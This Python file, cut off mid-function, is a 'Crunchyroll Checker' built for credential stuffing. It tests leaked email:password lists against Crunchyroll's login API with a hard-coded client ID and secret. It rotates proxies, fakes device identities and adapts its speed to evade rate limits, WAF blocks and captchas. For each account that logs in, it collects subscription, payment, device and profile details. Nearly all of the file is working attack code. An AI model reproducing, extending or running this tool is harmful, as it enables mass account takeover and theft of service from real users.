import requests
from requests.adapters import HTTPAdapter
import random
import json
import os
import time
import uuid
import sys
import argparse
import threading
import re
import csv
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone
from collections import deque
import codecs  # Added for better file encoding handling
import logging  # Added for better error logging

COMBO_FILE = "combos.txt"
PROXY_FILE = "proxy.txt"
DELAY = 1
CONFIG_FILE = "config.json"  # New: Config file for customizable settings

# Load config if exists (with error handling for malformed JSON)
config = {}
if os.path.exists(CONFIG_FILE):
    try:
        with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
            config = json.load(f)
    except (json.JSONDecodeError, ValueError) as e:
        logging.warning(f"Config file {CONFIG_FILE} is malformed, using defaults: {e}")
        config = {}
    except Exception as e:
        logging.warning(f"Error reading config file {CONFIG_FILE}, using defaults: {e}")
        config = {}

DEAD_DOMAINS = set(config.get('dead_domains', [
    "mailinator.com", "guerrillamail.com", "tempmail.com", "throwaway.email",
    "fakeinbox.com", "sharklasers.com", "grr.la", "guerrillamailblock.com",
    "pokemail.net", "spam4.me", "trash-mail.com", "mytrashmail.com",
    "mt2009.com", "trashymail.com", "mailnesia.com", "mailcatch.com",
    "tempinbox.com", "dispostable.com", "mailforspam.com", "spamgourmet.com",
    "mintemail.com", "tempr.email", "discard.email", "discardmail.com",
    "spamfree24.org", "jetable.org", "link2mail.net", "trashmail.com",
    "yopmail.com", "10minutemail.com", "getnada.com", "mohmal.com",
    "temp-mail.org", "emailondeck.com", "fakemailgenerator.com",
]))

EMAIL_REGEX = re.compile(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$')

ANDROID_UA = "Crunchyroll/3.74.2 Android/10 okhttp/4.12.0"

COUNTRY_FLAGS = {
    "US": "🇺🇸", "BR": "🇧🇷", "GB": "🇬🇧", "CA": "🇨🇦", "AU": "🇦🇺",
    "DE": "🇩🇪", "FR": "🇫🇷", "ES": "🇪🇸", "IT": "🇮🇹", "JP": "🇯🇵",
    "MX": "🇲🇽", "AR": "🇦🇷", "CL": "🇨🇱", "CO": "🇨🇴", "PE": "🇵🇪",
    "PT": "🇵🇹", "NL": "🇳🇱", "BE": "🇧🇪", "CH": "🇨🇭", "AT": "🇦🇹",
    "SE": "🇸🇪", "NO": "🇳🇴", "DK": "🇩🇰", "FI": "🇫🇮", "PL": "🇵🇱",
    "RU": "🇷🇺", "IN": "🇮🇳", "PH": "🇵🇭", "ID": "🇮🇩", "MY": "🇲🇾",
    "SG": "🇸🇬", "TH": "🇹🇭", "VN": "🇻🇳", "KR": "🇰🇷", "TW": "🇹🇼",
    "HK": "🇭🇰", "NZ": "🇳🇿", "ZA": "🇿🇦", "IE": "🇮🇪", "TR": "🇹🇷",
    "SA": "🇸🇦", "AE": "🇦🇪", "EG": "🇪🇬", "IL": "🇮🇱", "CZ": "🇨🇿",
    "HU": "🇭🇺", "RO": "🇷🇴", "GR": "🇬🇷", "UA": "🇺🇦", "VE": "🇻🇪",
}

COUNTRY_NAMES = {
    "US": "United States", "BR": "Brazil", "GB": "United Kingdom", "CA": "Canada",
    "AU": "Australia", "DE": "Germany", "FR": "France", "ES": "Spain",
    "IT": "Italy", "JP": "Japan", "MX": "Mexico", "AR": "Argentina",
    "CL": "Chile", "CO": "Colombia", "PE": "Peru", "PT": "Portugal",
    "NL": "Netherlands", "BE": "Belgium", "CH": "Switzerland", "AT": "Austria",
    "SE": "Sweden", "NO": "Norway", "DK": "Denmark", "FI": "Finland",
    "PL": "Poland", "RU": "Russia", "IN": "India", "PH": "Philippines",
    "ID": "Indonesia", "MY": "Malaysia", "SG": "Singapore", "TH": "Thailand",
    "VN": "Vietnam", "KR": "South Korea", "TW": "Taiwan", "HK": "Hong Kong",
    "NZ": "New Zealand", "ZA": "South Africa", "IE": "Ireland", "TR": "Turkey",
    "SA": "Saudi Arabia", "AE": "UAE", "EG": "Egypt", "IL": "Israel",
    "CZ": "Czech Republic", "HU": "Hungary", "RO": "Romania", "GR": "Greece",
    "UA": "Ukraine", "VE": "Venezuela",
}

class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    GRAY = "\033[90m"
    BOLD = "\033[1m"
    RESET = "\033[0m"


class StatsTracker:
    def __init__(self, total_combos):
        self.total = total_combos
        self.checked = 0
        self.premium = 0
        self.free = 0
        self.invalid = 0
        self.blocked = 0
        self.errors = 0
        self.start_time = time.time()
        self._lock = threading.Lock()
        self._check_times = deque(maxlen=100)
    
    def record_check(self, status):
        with self._lock:
            self.checked += 1
            self._check_times.append(time.time())
            if status == "premium":
                self.premium += 1
            elif status == "free":
                self.free += 1
            elif status == "invalid":
                self.invalid += 1
            elif status == "blocked":
                self.blocked += 1
            else:
                self.errors += 1
    
    def get_cpm(self):
        with self._lock:
            if len(self._check_times) < 2:
                elapsed = time.time() - self.start_time
                if elapsed > 0 and self.checked > 0:
                    return (self.checked / elapsed) * 60
                return 0
            oldest = self._check_times[0]
            newest = self._check_times[-1]
            time_span = newest - oldest
            if time_span > 0:
                return (len(self._check_times) / time_span) * 60
            return 0
    
    def get_eta(self):
        cpm = self.get_cpm()
        if cpm <= 0:
            return "N/A"
        remaining = self.total - self.checked
        if remaining <= 0:
            return "Done"
        minutes_left = remaining / cpm
        if minutes_left < 1:
            return f"{int(minutes_left * 60)}s"
        elif minutes_left < 60:
            return f"{int(minutes_left)}m"
        else:
            hours = int(minutes_left // 60)
            mins = int(minutes_left % 60)
            return f"{hours}h {mins}m"
    
    def get_progress_bar(self, width=20):
        with self._lock:
            if self.total == 0:
                return "[" + "=" * width + "]"
            pct = self.checked / self.total
            filled = int(width * pct)
            empty = width - filled
            bar = "█" * filled + "░" * empty
            return f"[{bar}] {pct*100:.1f}%"
    
    def get_elapsed(self):
        elapsed = time.time() - self.start_time
        if elapsed < 60:
            return f"{int(elapsed)}s"
        elif elapsed < 3600:
            return f"{int(elapsed // 60)}m {int(elapsed % 60)}s"
        else:
            hours = int(elapsed // 3600)
            mins = int((elapsed % 3600) // 60)
            return f"{hours}h {mins}m"
    
    def get_stats_line(self):
        cpm = self.get_cpm()
        eta = self.get_eta()
        bar = self.get_progress_bar(15)
        return f"{bar} | CPM:{cpm:.0f} | ETA:{eta} | ✅{self.premium} ⚪{self.free} ❌{self.invalid}"


def is_valid_email(email):
    if not email or len(email) < 5:
        return False
    if not EMAIL_REGEX.match(email):
        return False
    return True


def is_blacklisted_domain(email):
    if "@" not in email:
        return False
    domain = email.split("@")[1].lower()
    return domain in DEAD_DOMAINS


class AdaptiveThrottler:
    def __init__(self, base_delay=0.5):
        self.base_delay = base_delay
        self.current_delay = base_delay
        self.min_delay = 0.1
        self.max_delay = 10.0
        self.consecutive_blocks = 0
        self.consecutive_success = 0
        self._lock = threading.Lock()
    
    def record_success(self):
        with self._lock:
            self.consecutive_success += 1
            self.consecutive_blocks = 0
            if self.consecutive_success >= 5:
                self.current_delay = max(self.min_delay, self.current_delay * 0.8)
                self.consecutive_success = 0
    
    def record_block(self):
        with self._lock:
            self.consecutive_blocks += 1
            self.consecutive_success = 0
            if self.consecutive_blocks >= 2:
                self.current_delay = min(self.max_delay, self.current_delay * 1.5)
                self.consecutive_blocks = 0
    
    def get_delay(self):
        with self._lock:
            jitter = random.uniform(0.8, 1.2)
            return self.current_delay * jitter
    
    def wait(self):
        delay = self.get_delay()
        if delay > 0.1:
            time.sleep(delay)


class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.current_index = 0
        self.bad_proxies = set()
        self.proxy_fail_count = {}
        self.proxy_success_count = {}
        self.proxy_response_times = {}
        self.max_fails_per_proxy = 3
        self.use_proxies = False
        self._lock = threading.Lock()
        
    def load_proxies(self, filepath):
        self.proxies = []
        if not os.path.exists(filepath):
            logging.warning(f"{filepath} not found → running without proxies")
            return 0
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        proxy = self._parse_proxy(line)
                        if proxy:
                            self.proxies.append(proxy)
            if self.proxies:
                self.use_proxies = True
                random.shuffle(self.proxies)
            logging.info(f"Loaded {len(self.proxies)} proxies")
            return len(self.proxies)
        except Exception as e:
            logging.error(f"Error loading proxies: {e}")
            return 0
    
    def _parse_proxy(self, line):
        line = line.strip()
        if not line:
            return None
        
        if '://' in line:
            # Improved: Support socks5 directly
            if line.startswith('socks5://') or line.startswith('http://') or line.startswith('https://'):
                return line
            return None
        
        parts = line.split(':')
        if len(parts) == 2:
            return f"http://{parts[0]}:{parts[1]}"
        elif len(parts) == 4:
            ip, port, user, pwd = parts
            return f"http://{user}:{pwd}@{ip}:{port}"
        return None
    
    def _get_proxy_score(self, proxy):
        successes = self.proxy_success_count.get(proxy, 0)
        fails = self.proxy_fail_count.get(proxy, 0)
        avg_time = self.proxy_response_times.get(proxy, 5.0)
        score = (successes * 2) - (fails * 3) - (avg_time * 0.5)
        return score
    
    def get_next_proxy(self, use_scoring=True):
        if not self.use_proxies or not self.proxies:
            return None
        
        with self._lock:
            available = [p for p in self.proxies if p not in self.bad_proxies]
            if not available:
                logging.warning("All proxies exhausted, resetting bad proxy list...")
                self.bad_proxies.clear()
                self.proxy_fail_count.clear()
                self.proxy_success_count.clear()
                available = self.proxies
            
            if use_scoring and len(available) > 3:
                scored = [(p, self._get_proxy_score(p)) for p in available]
                scored.sort(key=lambda x: x[1], reverse=True)
                top_proxies = [p for p, _ in scored[:max(3, len(scored)//3)]]
                return random.choice(top_proxies)
            else:
                self.current_index = (self.current_index + 1) % len(available)
                return available[self.current_index]
    
    def rotate_proxy(self):
        return self.get_next_proxy()
    
    def mark_proxy_failed(self, proxy):
        if proxy:
            with self._lock:
                self.proxy_fail_count[proxy] = self.proxy_fail_count.get(proxy, 0) + 1
                if self.proxy_fail_count[proxy] >= self.max_fails_per_proxy:
                    self.bad_proxies.add(proxy)
                    logging.warning("Proxy marked as bad (too many fails)")
    
    def mark_proxy_success(self, proxy, response_time=None):
        if proxy:
            with self._lock:
                self.proxy_success_count[proxy] = self.proxy_success_count.get(proxy, 0) + 1
                if proxy in self.proxy_fail_count:
                    self.proxy_fail_count[proxy] = max(0, self.proxy_fail_count.get(proxy, 0) - 1)
                if response_time is not None:
                    old_time = self.proxy_response_times.get(proxy, response_time)
                    self.proxy_response_times[proxy] = (old_time + response_time) / 2
    
    def get_working_proxy_count(self):
        with self._lock:
            return len([p for p in self.proxies if p not in self.bad_proxies])
    
    def get_proxy_dict(self, proxy):
        if not proxy:
            return None
        return {"http": proxy, "https": proxy}
    
    def get_proxy_display(self, proxy):
        if not proxy:
            return "DIRECT"
        try:
            clean = proxy.replace("http://", "").replace("https://", "").replace("socks5://", "")
            if "@" in clean:
                clean = clean.split("@")[1]
            if ":" in clean:
                parts = clean.split(":")
                ip = parts[0]
                port = parts[1] if len(parts) > 1 else "?"
                ip_short = ip[:12] + ".." if len(ip) > 14 else ip
                return f"{ip_short}:{port}"
            return clean[:20]
        except:
            return proxy[:20]
    
    def _test_single_proxy(self, proxy, timeout=5):
        try:
            proxy_dict = {"http": proxy, "https": proxy}
            resp = requests.get(
                "https://www.crunchyroll.com",
                proxies=proxy_dict,
                timeout=timeout,
                headers={"User-Agent": ANDROID_UA}
            )
            return resp.status_code in [200, 403, 302, 301]
        except:
            return False
    
    def validate_proxies(self, max_threads=20, timeout=5):
        if not self.proxies:
            return 0
        
        logging.info(f"Validating {len(self.proxies)} proxies...")
        
        valid_proxies = []
        dead_proxies = []
        validated = 0
        total = len(self.proxies)
        print_lock = threading.Lock()
        
        def test_proxy(proxy):
            nonlocal validated
            result = self._test_single_proxy(proxy, timeout)
            with print_lock:
                validated += 1
                display = self.get_proxy_display(proxy)
                if result:
                    valid_proxies.append(proxy)
                    print(f"\r{Colors.GREEN}   [{validated}/{total}] ✅ {display}{Colors.RESET}".ljust(60), end="", flush=True)
                else:
                    dead_proxies.append(proxy)
                    print(f"\r{Colors.RED}   [{validated}/{total}] ❌ {display}{Colors.RESET}".ljust(60), end="", flush=True)
            return result
        
        with ThreadPoolExecutor(max_workers=min(max_threads, len(self.proxies))) as executor:
            futures = []
            for i, proxy in enumerate(self.proxies):
                futures.append(executor.submit(test_proxy, proxy))
                if i < max_threads and i > 0:
                    time.sleep(0.1)
            for future in as_completed(futures):
                try:
                    future.result()
                except:
                    pass
        
        print()
        
        if valid_proxies:
            self.proxies = valid_proxies
            for dead in dead_proxies:
                self.bad_proxies.add(dead)
            logging.info(f"✅ {len(valid_proxies)} working proxies")
            if dead_proxies:
                logging.warning(f"❌ {len(dead_proxies)} dead proxies removed")
            return len(valid_proxies)
        else:
            logging.error("No working proxies found!")
            self.use_proxies = False
            return 0


class CrunchyrollChecker:
    def __init__(self, proxy_manager=None, brutal_mode=False, ultra_mode=False, skip_optional=True):
        self.proxy_manager = proxy_manager
        self.current_proxy = None
        self.brutal_mode = brutal_mode
        self.ultra_mode = ultra_mode
        self.skip_optional = skip_optional
        self._create_new_session()
        
    def _create_new_session(self):
        self.session = requests.Session()
        adapter = HTTPAdapter(
            pool_connections=20,
            pool_maxsize=20,
            max_retries=0
        )
        self.session.mount('https://', adapter)
        self.session.mount('http://', adapter)
        self.device_id = str(uuid.uuid4())
        if self.proxy_manager and self.proxy_manager.use_proxies:
            self.current_proxy = self.proxy_manager.get_next_proxy()
            
    def _regenerate_identity(self):
        self.session = requests.Session()
        self.device_id = str(uuid.uuid4())
        if self.proxy_manager and self.proxy_manager.use_proxies:
            self.current_proxy = self.proxy_manager.rotate_proxy()
        
    def _human_delay(self, min_sec=0.5, max_sec=1.5):
        if self.brutal_mode or self.ultra_mode:
            return
        delay = random.uniform(min_sec, max_sec)
        time.sleep(delay)
        
    def _random_pause(self):
        if self.brutal_mode or self.ultra_mode:
            return
        if random.random() < 0.15:
            pause = random.uniform(0.3, 1.0)
            time.sleep(pause)
    
    def _get_timeout(self, default=20):
        if self.ultra_mode:
            return 5
        elif self.brutal_mode:
            return 8
        return default + random.uniform(1, 3)  # Added jitter
        
    def _get_proxies(self):
        if self.current_proxy and self.proxy_manager:
            return self.proxy_manager.get_proxy_dict(self.current_proxy)
        return None
    
    def login(self, email, password):
        self._human_delay(0.5, 1.5)
        
        headers = {
            "User-Agent": ANDROID_UA,
            "Accept-Encoding": "gzip"
        }
        
        data = {
            "grant_type": "password",
            "username": email,
            "password": password,
            "scope": "offline_access",
            "client_id": "ajcylfwdtjjtq7qpgks3",
            "client_secret": "oKoU8DMZW7SAaQiGzUEdTQG4IimkL8I_",
            "device_type": "com.crunchyroll.crunchyroid",
            "device_id": self.device_id,
            "device_name": "Goku"
        }
        
        try:
            resp = self.session.post(
                "https://beta-api.crunchyroll.com/auth/v1/token",
                headers=headers,
                data=data,
                timeout=self._get_timeout(20),
                proxies=self._get_proxies()
            )
            
            if resp.status_code == 200:
                if self.proxy_manager and self.current_proxy:
                    self.proxy_manager.mark_proxy_success(self.current_proxy)
                return resp.json()
            elif resp.status_code == 401:
                if self.proxy_manager and self.current_proxy:
                    self.proxy_manager.mark_proxy_success(self.current_proxy)
                try:
                    error_data = resp.json()
                    error_code = error_data.get("error", "").lower()
                    error_desc = error_data.get("error_description", "").lower()
                    
                    if "password" in error_desc and "reset" in error_desc:
                        return {"error": "password_reset_required"}
                    elif "force" in error_desc or "expired" in error_desc:
                        return {"error": "password_reset_required"}
                    elif "locked" in error_desc or "suspended" in error_desc:
                        return {"error": "account_locked"}
                    elif "verify" in error_desc or "verification" in error_desc:
                        return {"error": "email_verification_required"}
                    elif "2fa" in error_desc or "two" in error_desc or "mfa" in error_desc:
                        return {"error": "2fa_enabled"}
                    else:
                        return {"error": "invalid_credentials"}
                except:
                    return {"error": "invalid_credentials"}
            elif resp.status_code == 403:
                if self.proxy_manager and self.current_proxy:
                    self.proxy_manager.mark_proxy_failed(self.current_proxy)
                try:
                    error_data = resp.json()
                    error_desc = error_data.get("error_description", "").lower()
                    if "password" in error_desc or "reset" in error_desc:
                        return {"error": "password_reset_required"}
                    elif "locked" in error_desc or "banned" in error_desc:
                        return {"error": "account_locked"}
                    # New: Check for captcha
                    if "captcha" in resp.text.lower():
                        return {"error": "captcha_required"}
                    else:
                        return {"error": "waf_blocked"}
                except:
                    return {"error": "waf_blocked"}
            elif resp.status_code == 429:
                if self.proxy_manager and self.current_proxy:
                    self.proxy_manager.mark_proxy_failed(self.current_proxy)
                # Improved: Exponential backoff for rate limit
                backoff = 10 + random.uniform(0, 20)  # 10-30s
                logging.warning(f"Rate limited - sleeping {backoff:.1f}s")
                time.sleep(backoff)
                return {"error": "rate_limited"}
            elif resp.status_code in [502, 503, 504]:
                if self.proxy_manager and self.current_proxy:
                    self.proxy_manager.mark_proxy_failed(self.current_proxy)
                return {"error": "proxy_error"}
            else:
                if "invalid_grant" in resp.text:
                    return {"error": "invalid_credentials"}
                return {"error": f"http_{resp.status_code}"}
                
        except requests.exceptions.ProxyError:
            if self.proxy_manager and self.current_proxy:
                self.proxy_manager.mark_proxy_failed(self.current_proxy)
            return {"error": "proxy_error"}
        except requests.exceptions.Timeout:
            if self.proxy_manager and self.current_proxy:
                self.proxy_manager.mark_proxy_failed(self.current_proxy)
            return {"error": "timeout"}
        except requests.exceptions.ConnectionError:
            if self.proxy_manager and self.current_proxy:
                self.proxy_manager.mark_proxy_failed(self.current_proxy)
            return {"error": "connection_error"}
        except requests.exceptions.RequestException as e:
            return {"error": str(e)}
    
    def get_account_info(self, access_token):
        self._human_delay(0.3, 0.8)
        
        headers = {
            "User-Agent": ANDROID_UA,
            "Authorization": f"Bearer {access_token}",
            "Accept": "application/json",
        }
        
        try:
            resp = self.session.get(
                "https://beta-api.crunchyroll.com/accounts/v1/me",
                headers=headers,
                timeout=15,
                proxies=self._get_proxies()
            )
            
            if resp.status_code == 200:
                return resp.json()
            else:
                return {"error": f"account_fetch_failed_{resp.status_code}"}
                
        except Exception as e:
            return {"error": str(e)}
    
    def get_benefits(self, access_token, external_id):
        self._human_delay(0.2, 0.6)
        
        headers = {
            "User-Agent": ANDROID_UA,
            "Authorization": f"Bearer {access_token}",
            "Accept": "application/json",
        }
        
        try:
            resp = self.session.get(
                f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits",
                headers=headers,
                timeout=15,
                proxies=self._get_proxies()
            )
            
            if resp.status_code == 200:
                return resp.json()
            else:
                return None
                
        except:
            return None
    
    def get_subscription(self, access_token, account_id):
        self._human_delay(0.2, 0.5)
        
        headers = {
            "User-Agent": ANDROID_UA,
            "Authorization": f"Bearer {access_token}",
            "Accept": "application/json",
        }
        
        try:
            resp = self.session.get(
                f"https://beta-api.crunchyroll.com/subs/v4/accounts/{account_id}/subscriptions",
                headers=headers,
                timeout=10,
                proxies=self._get_proxies()
            )
            
            if resp.status_code == 200:
                return resp.json()
            else:
                return None
                
        except:
            return None
    
    def get_profile(self, access_token):
        self._human_delay(0.2, 0.5)
        
        headers = {
            "User-Agent": ANDROID_UA,
            "Authorization": f"Bearer {access_token}",
            "Accept": "application/json",
        }
        
        try:
            resp = self.session.get(
                "https://beta-api.crunchyroll.com/accounts/v1/me/profile",
                headers=headers,
                timeout=10,
                proxies=self._get_proxies()
            )
            
            if resp.status_code == 200:
                return resp.json()
            else:
                return None
                
        except:
            return None
    
    def get_multiprofile(self, access_token):
        self._human_delay(0.2, 0.5)
        
        headers = {
            "User-Agent": ANDROID_UA,
            "Authorization": f"Bearer {access_token}",
            "Accept": "application/json",
        }
        
        try:
            resp = self.session.get(
                "https://beta-api.crunchyroll.com/accounts/v1/me/multiprofile",
                headers=headers,
                timeout=10,
                proxies=self._get_proxies()
            )
            
            if resp.status_code == 200:
                return resp.json()
            else:
                return None
                
        except:
            return None
    
    def get_devices(self, access_token):
        self._human_delay(0.2, 0.5)
        
        headers = {
            "User-Agent": ANDROID_UA,
            "Authorization": f"Bearer {access_token}",
            "Accept": "application/json",
        }
        
        try:
            resp = self.session.get(
                "https://beta-api.crunchyroll.com/accounts/v1/me/credentials",
                headers=headers,
                timeout=10,
                proxies=self._get_proxies()
            )
            
            if resp.status_code == 200:
                return resp.json()
            else:
                return None
                
        except:
            return None
    
    def get_watchlist(self, access_token, account_id):
        self._random_pause()
        
        headers = {
            "User-Agent": ANDROID_UA,
            "Authorization": f"Bearer {access_token}",
            "Accept": "application/json",
        }
        
        try:
            resp = self.session.get(
                f"https://beta-api.crunchyroll.com/content/v2/{account_id}/watchlist?n=1",
                headers=headers,
                timeout=10,
                proxies=self._get_proxies()
            )
            
            if resp.status_code == 200:
                return resp.json()
            else:
                return None
                
        except:
            return None
    
    def get_history(self, access_token, account_id):
        self._random_pause()
        
        headers = {
            "User-Agent": ANDROID_UA,
            "Authorization": f"Bearer {access_token}",
            "Accept": "application/json",
        }
        
        try:
            resp = self.session.get(
                f"https://beta-api.crunchyroll.com/content/v2/{account_id}/watch-history?n=1",
                headers=headers,
                timeout=10,
                proxies=self._get_proxies()
            )
            
            if resp.status_code == 200:
                return resp.json()
            else:
                return None
                
        except:
            return None
    
    def get_custom_lists(self, access_token, account_id):
        self._random_pause()
        
        headers = {
            "User-Agent": ANDROID_UA,
            "Authorization": f"Bearer {access_token}",
            "Accept": "application/json",
        }
        
        try:
            resp = self.session.get(
                f"https://beta-api.crunchyroll.com/content/v2/{account_id}/custom-lists?n=100",
                headers=headers,
                timeout=10,
                proxies=self._get_proxies()
            )
            
            if resp.status_code == 200:
                return resp.json()
            else:
                return None
                
        except:
            return None


def print_banner():
    print(f"{Colors.CYAN}")
    print("╔══════════════════════════════════════════════════════╗")
    print("║      🍥 CRUNCHYROLL CHECKER - ULTRA EDITION          ║")
    print("║   CPM + ETA + Proxy Scoring + Adaptive Throttle      ║")
    print("╚══════════════════════════════════════════════════════╝")
    print(f"{Colors.RESET}")
    print(f"{Colors.YELLOW}🎯 Features:{Colors.RESET}")
    print(" 📊 CPM counter + ETA + Progress bar")
    print(" 🔍 Proxy validation + Smart scoring")
    print(" 🎛️  Adaptive throttling (auto speed adjust)")
    print(" 🧹 Duplicate removal + Email validation")
    print(" 🚫 Domain blacklist (temp emails)")
    print(" 📁 Export: TXT, JSON, CSV")
    print(" 🔄 Smart proxy rotation with fail tracking")
    print(" ♻️  Queue-based recheck (blocked → back of queue)")
    print(" 🔥 BRUTAL / 💀 ULTRA / ⚡ TURBO modes")
    print(" 📱 Connected devices + 👥 Multi-profile info")
    print()
    print(f"{Colors.BLUE}📝 Usage:{Colors.RESET}")
    print(f"   python saf.py                    {Colors.WHITE}# Interactive mode{Colors.RESET}")
    print(f"   python saf.py -a                 {Colors.WHITE}# Auto mode (use defaults){Colors.RESET}")
    print(f"   python saf.py -c combos.txt -b   {Colors.WHITE}# Custom combo + brutal{Colors.RESET}")
    print(f"   python saf.py -u -t 20           {Colors.WHITE}# ULTRA + 20 threads{Colors.RESET}")
    print(f"   python saf.py -s -t 10           {Colors.WHITE}# Skip proxy validation{Colors.RESET}")
    print(f"   python saf.py -c file.txt -p proxies.txt -u -t 10 -r 3")
    print()


def get_txt_files():
    files = []
    for f in os.listdir('.'):
        if f.endswith('.txt') and not f.endswith('_results.txt') and not f.endswith('_premium.txt') and not f.endswith('_unchecked.txt'):
            if 'proxy' not in f.lower() and 'proxies' not in f.lower():
                files.append(f)
    return sorted(files)


def get_proxy_files():
    files = []
    for f in os.listdir('.'):
        if f.endswith('.txt') and ('proxy' in f.lower() or 'proxies' in f.lower()):
            files.append(f)
    return sorted(files)


def select_file(files, file_type):
    if not files:
        return None
    
    print(f"\n{Colors.CYAN}📁 Available {file_type} files:{Colors.RESET}")
    for i, f in enumerate(files, 1):
        try:
            with open(f, 'r', encoding='utf-8', errors='ignore') as file:
                line_count = sum(1 for line in file if line.strip())
            print(f"  {Colors.GREEN}[{i}]{Colors.RESET} {f} ({line_count} lines)")
        except:
            print(f"  {Colors.GREEN}[{i}]{Colors.RESET} {f}")
    
    print(f"  {Colors.YELLOW}[0]{Colors.RESET} Skip / Use default")
    
    while True:
        try:
            choice = input(f"\n{Colors.CYAN}Select {file_type} file (0-{len(files)}): {Colors.RESET}").strip()
            if choice == '' or choice == '0':
                return None
            idx = int(choice) - 1
            if 0 <= idx < len(files):
                return files[idx]
            print(f"{Colors.RED}Invalid choice{Colors.RESET}")
        except ValueError:
            print(f"{Colors.RED}Enter a number{Colors.RESET}")
        except KeyboardInterrupt:
            return None


def load_combos(filepath, validate=True, remove_duplicates=True, check_blacklist=True):
    if not os.path.exists(filepath):
        logging.error(f"{filepath} not found!")
        return []
    
    raw_combos = []
    with codecs.open(filepath, "r", encoding="utf-8-sig", errors="ignore") as f:  # Improved encoding
        for line in f:
            line = line.strip()
            if not line or ":" not in line:
                continue
            email, password = line.split(":", 1)
            raw_combos.append((email.strip().lower(), password.strip()))
    
    total_loaded = len(raw_combos)
    logging.info(f"Loaded {total_loaded} combos")
    
    combos = raw_combos
    removed_stats = {"duplicates": 0, "invalid": 0, "blacklisted": 0}
    
    if remove_duplicates:
        seen = set()
        unique_combos = []
        for email, password in combos:
            if email not in seen:
                seen.add(email)
                unique_combos.append((email, password))
        removed_stats["duplicates"] = len(combos) - len(unique_combos)
        combos = unique_combos
    
    if validate:
        valid_combos = []
        for email, password in combos:
            if is_valid_email(email):
                valid_combos.append((email, password))
        removed_stats["invalid"] = len(combos) - len(valid_combos)
        combos = valid_combos
    
    if check_blacklist:
        clean_combos = []
        for email, password in combos:
            if not is_blacklisted_domain(email):
                clean_combos.append((email, password))
        removed_stats["blacklisted"] = len(combos) - len(clean_combos)
        combos = clean_combos
    
    removed_total = sum(removed_stats.values())
    if removed_total > 0:
        parts = [f"{v} {k}" for k, v in removed_stats.items() if v > 0]
        logging.info(f"Filtered: {', '.join(parts)} → {len(combos)} remaining")
    
    return combos


def get_country_display(country_code):
    if not country_code:
        return "Unknown 🌍"
    code = country_code.upper()
    name = COUNTRY_NAMES.get(code, country_code)
    flag = COUNTRY_FLAGS.get(code, "🌍")
    return f"{name} {flag}"


def calculate_remaining_days(date_str):
    if not date_str or date_str == "N/A" or date_str == "Never":
        return "N/A"
    try:
        if "T" in date_str:
            date_str = date_str.split("T")[0]
        dt = datetime.strptime(date_str, "%Y-%m-%d")
        dt = dt.replace(tzinfo=timezone.utc)
        now = datetime.now(timezone.utc)
        diff = dt - now
        if diff.days >= 0:
            return f"{diff.days} days"
        else:
            return "Expired"
    except:
        return "N/A"


def detect_payment_source(sub_data):
    if not sub_data:
        return "Unknown"
    
    sub_str = str(sub_data).lower()
    
    if "google" in sub_str or "play" in sub_str:
        return "Google Play"
    elif "apple" in sub_str or "ios" in sub_str or "itunes" in sub_str:
        return "Apple"
    elif "stripe" in sub_str:
        return "Stripe"
    elif "paypal" in sub_str:
        return "PayPal"
    elif "roku" in sub_str:
        return "Roku"
    elif "amazon" in sub_str:
        return "Amazon"
    
    if isinstance(sub_data, dict):
        sub_list = sub_data.get("subscriptions", []) or sub_data.get("items", [])
        for item in sub_list:
            source = item.get("source", "").lower()
            if source:
                if "google" in source:
                    return "Google Play"
                elif "apple" in source:
                    return "Apple"
                elif "stripe" in source:
                    return "Stripe"
                return source.title()
    
    return "Crunchyroll"


def detect_plan_type(sub_data):
    if not sub_data:
        return "subscription"
    
    sub_str = str(sub_data).lower()
    
    if "trial" in sub_str or "free_trial" in sub_str:
        return "Trial"
    elif "bundle" in sub_str or "combo" in sub_str:
        return "Bundle"
    elif "gift" in sub_str:
        return "Gift"
    elif "promo" in sub_str:
        return "Promo"
    
    return "Subscription"


def check_account(checker, email, password, retry_count=0):
    login_result = checker.login(email, password)
    
    if "error" in login_result:
        error = login_result["error"]
        
        blockable_errors = ["waf_blocked", "rate_limited", "timeout", "proxy_error", "connection_error", "captcha_required"]  # Added captcha
        if error in blockable_errors:
            return {"status": "blocked", "error": error, "retry_count": retry_count}
        
        if error == "invalid_credentials":
            return {"status": "invalid"}
        elif error == "password_reset_required":
            return {"status": "password_reset"}
        elif error == "account_locked":
            return {"status": "locked"}
        elif error == "email_verification_required":
            return {"status": "email_verify"}
        elif error == "2fa_enabled":
            return {"status": "2fa"}
        else:
            return {"status": "error", "error": error}
    else:
        access_token = login_result.get("access_token")
        refresh_token = login_result.get("refresh_token", "N/A")
        token_type = login_result.get("token_type", "N/A")
        expires_in = login_result.get("expires_in", "N/A")
        scope = login_result.get("scope", "N/A")
        
        if access_token:
            account_info = checker.get_account_info(access_token)
            
            if "error" in account_info:
                return {"status": "error", "error": "account_fetch_failed"}
            
            external_id = account_info.get("external_id", "")
            account_id = account_info.get("account_id", "")
            profile_id = account_info.get("profile_id", "")
            
            api_results = {}
            def fetch_benefits():
                api_results['benefits'] = checker.get_benefits(access_token, external_id)
            def fetch_subs():
                api_results['subs'] = checker.get_subscription(access_token, account_id)
            def fetch_profile():
                api_results['profile'] = checker.get_profile(access_token)
            def fetch_multiprofile():
                api_results['multiprofile'] = checker.get_multiprofile(access_token)
            def fetch_devices():
                api_results['devices'] = checker.get_devices(access_token)
            
            threads = [
                threading.Thread(target=fetch_benefits),
                threading.Thread(target=fetch_subs),
                threading.Thread(target=fetch_profile),
                threading.Thread(target=fetch_multiprofile),
                threading.Thread(target=fetch_devices),
            ]
            for t in threads:
                t.start()
            for t in threads:
                t.join()
            
            benefits = api_results.get('benefits')
            subs_data = api_results.get('subs')
            profile_info = api_results.get('profile')
            multiprofile_info = api_results.get('multiprofile')
            devices_info = api_results.get('devices')
            
            items = benefits.get("items", []) if benefits else []
            total = benefits.get("total", 0) if benefits else 0
            country = benefits.get("subscription_country", "") if benefits else ""
            
            streams = "1"
            ad_free = False
